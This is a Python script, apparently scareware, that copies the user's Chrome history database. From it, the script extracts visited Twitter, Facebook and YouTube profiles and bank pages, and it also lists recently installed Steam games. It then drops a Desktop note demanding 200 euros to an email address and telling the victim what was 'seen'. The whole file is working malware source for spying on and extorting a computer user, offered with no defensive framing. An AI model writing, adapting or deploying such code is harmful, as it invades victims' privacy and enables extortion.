import os
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
from pathlib import Path
import re
import glob

File_Name = "Abre.txt "
USER_PATH = "C:\\Users\\" + os.getlogin()

def check_steam_games(file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = []
    games_path = glob.glob(steam_path)
    games_path.sort(key=os.path.getctime, reverse=True)
    for games_path in games_path:
        games.append(games_path.split("\\")[-1])
    file.write("\nHe visto que tambien has estado jugando ultimamente a {}....".format(", ".join(games[:3])))


def spying_youtube(chrome_history,file):
    channels_visited = []
    for item in chrome_history[:20]:
        results_channels = re.findall("https://www.youtube.com/@([a-zA-z0-9]+)$", item[2])
        if results_channels:
            channels_visited.append(results_channels[0])
    if channels_visited:

       file.write("\nHe visto que has estado revisando los canales de {}...".format(", ".join(channels_visited)))


def spying_facebook(chrome_history,file):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://www.facebook.com/([0-9a-zA-Z./]+)$", item[2])
        if results:
            profiles_visited.append(results[0])
    if profiles_visited:
        file.write("\nHe visto que has estado revisando los canales de {}...".format(", ".join(profiles_visited)))




def get_user_path():
    return "{}/".format(Path.home())


def create_file(user_path):
   file = open(user_path + "Desktop/" + File_Name, "w")
   file.write("Envia 200 euros a esta dirrecion AliJunior@gmail.com \n\n")
   return file

def delay_action():
    n_hours = randrange(1,4)
    n_min = randrange(1,60)
    print("Durmiendo {} horas y {} minutos.".format(n_hours,n_min))
    sleep(n_hours *60 *60 + n_min *60)

def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            History_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            temp_history = History_path + "temp"
            copyfile(History_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError as e:
            print("La base de datos esta abierta")
            sleep(3)



def check_twitter_history_and_scared_user(chrome_history,file):
    profiles_visited = []
    for item in chrome_history:
       results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
       if results and results[0] not in ["notifications","home"]:
           profiles_visited.append(results[0])
    file.write("\nHe visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))

def check_bank_visit(chrome_history,file):
    his_bank = None
    banks = ["BBVA","Caixa Bank","Banco Santander","Banco Santander","Bankia","Banco Sabadell","Kutxabank","Abanca",
             "Unicaja Banco","Ibercaja]","Bankinter","Liberbank","Banca March","Banca Pueyo","Bank","Banco","Caixa",
             "BBVA","Caixa Bank","Banco Santander","Bankia","Banco Sabadell","Kutxabank",  "Abanca","Unicaja","Ibercaja","ing"]

    for item in chrome_history:
        for i in banks:
            if i.lower() in item[0].lower():
                his_bank = i
                break
        if his_bank:
            break
    file.write("\nAdemas veo que has entrado en alguna pagina de banco como {}... Interesante".format(his_bank))



def main():

    user_path = get_user_path()
    #delay_action()
    file = create_file(user_path)
    chrome_history = get_chrome_history(user_path)
    check_twitter_history_and_scared_user(chrome_history,file)
    check_bank_visit(chrome_history,file)
    spying_youtube(chrome_history,file)
    spying_facebook(chrome_history, file)
    check_steam_games(file)


if __name__ == "__main__":
    main()











